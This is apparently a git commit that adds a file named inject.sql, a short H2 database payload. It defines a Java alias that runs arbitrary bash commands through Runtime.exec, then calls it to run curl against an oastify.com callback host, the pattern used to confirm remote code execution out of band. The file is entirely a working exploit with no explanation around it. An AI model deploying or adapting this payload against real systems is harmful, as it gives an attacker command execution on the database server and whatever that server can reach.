28f97ad2a3ac012978164d9d5557640fb3882b52
athena133712 <149477345+athena133712@users.noreply.github.com>
2023-11-03 13:58:53 +0700

    Create inject.sql

---
+++ inject.sql
@@ -0,0 +1,6 @@
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+        String[] command = {"bash", "-c", cmd};
+        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+        return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('curl 0yzd7svyeclk8cid79e6400uqlwck98y.oastify.com')
